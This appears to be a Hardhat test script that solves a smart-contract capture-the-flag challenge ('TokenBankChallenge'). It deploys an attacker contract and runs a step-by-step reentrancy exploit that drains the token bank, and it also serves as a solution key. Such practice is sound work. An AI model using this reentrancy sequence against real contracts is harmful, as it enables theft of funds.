const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = `0xaA806ff4e5C01b3fA2fdC46B7eD0939909A5aa38`;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const factory = await ethers.getContractFactory("TokenBankChallenge");
  tokenBank = factory.attach(CHALLENGE_ADDRESS);
  const tokenAddress = await tokenBank.token();
  const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
  simpleToken = tokenFactory.attach(tokenAddress);
});

it("TokenBank", async function () {
  const tokenRecieverFactory = await ethers.getContractFactory("TokenReciever");
  console.log("Deploying attacker contract");
  tokenReciever = await tokenRecieverFactory.deploy(
    simpleToken.address,
    tokenBank.address
  );
  await tokenReciever.deployed();
  console.log("Attacker contract deployed");
  console.log(" ");

  console.log("First withdrawing balance from the bank!");
  const myBalance = await tokenBank.balanceOf(eoa.address);
  const tx1 = await tokenBank.withdraw(myBalance);
  await tx1.wait();
  console.log(" ");

  console.log(
    "As transferFrom will not trigger the fallback function, therefore,"
  );
  console.log("approving attacker contract to transfer this amount to itself");
  const tx2 = await simpleToken
    .connect(eoa)
    .approve(tokenReciever.address, myBalance);
  await tx2.wait();
  console.log(" ");

  console.log(
    "calling transferFrom of attacker contract to transfer fund from my account to itself"
  );
  const tx3 = await tokenReciever.transferFrom(
    eoa.address,
    tokenReciever.address,
    myBalance,
    { gasLimit: 3e6 }
  );
  await tx3.wait();
  console.log(" ");

  console.log(
    "transferring entire token balance from attack contract to tokenbank to ensure balance of contract !=0"
  );
  const tx4 = await tokenReciever.transfer(tokenBank.address, {
    gasLimit: 3e6,
  });
  await tx4.wait();
  console.log(" ");

  console.log("calling fallback function of tokenReciever to begin reentrancy");
  console.log("address, value and bytes are redundant");
  const tx5 = await tokenReciever.tokenFallback(
    tokenBank.address,
    1,
    ethers.utils.formatBytes32String(""),
    { gasLimit: 3e6 }
  );
  await tx5.wait();
  var isComplete = await tokenBank.isComplete();
  expect(isComplete).to.be.true;
  console.log(" ");
  console.log("Re-entrancy attack successful!!");
  util.updateTotalPoints(scriptName);
});
